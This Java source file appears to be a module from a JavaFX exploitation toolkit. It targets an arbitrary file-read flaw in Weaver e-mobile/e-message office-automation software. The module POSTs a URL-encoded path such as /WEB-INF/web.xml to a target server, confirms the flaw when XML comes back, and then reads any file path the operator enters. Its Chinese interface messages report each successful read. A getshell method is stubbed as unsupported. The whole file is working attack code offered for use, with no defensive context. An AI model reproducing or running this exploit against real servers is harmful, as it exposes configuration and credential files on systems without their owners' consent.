package exp.oa.weaveroa.emobile;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;

import java.util.HashMap;

public class weaver_emessage_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 不支持getshell功能");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        String var = getAllEncode.getAllUrlEncode("/WEB-INF/web.xml","");
        try {
            Response post_res = HttpTools.post(url + "/",var, new HashMap<>(), "utf-8");
            if (post_res.getCode() == 200 && post_res.getText().contains("xml")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ weaver_emessage_FileRead ]");
                    textArea.appendText("\n 成功读取/WEB-INF/web.xml文件");
                    textArea.appendText("\n 输入文件名进行读取,eg:/WEB-INF/web.xml");
                    textArea.appendText("\n");
                    textArea_cmd.appendText("\n"+post_res.getText());
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        String var = getAllEncode.getAllUrlEncode(cmd,"");
        try {
            Response post_res = HttpTools.post(url + "/",var, new HashMap<>(), "utf-8");
            if (post_res.getCode() == 200 && post_res.getText()!="") {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取成功！");
                    textArea_cmd.appendText("\n"+post_res.getText());
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 读取失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
